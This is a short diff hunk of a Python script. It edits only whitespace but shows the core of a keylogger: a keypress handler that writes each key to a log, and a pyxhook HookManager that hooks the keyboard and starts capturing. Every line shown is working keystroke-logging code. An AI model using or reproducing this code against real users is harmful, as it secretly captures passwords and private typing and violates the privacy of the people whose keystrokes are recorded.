@@ -33,9 +33,6 @@ def keypress(event):
 		log.write(event.Key)
 
 key=pyxhook.HookManager()
-
 key.KeyDown=keypress
-
 key.HookKeyboard()
-
 key.start()
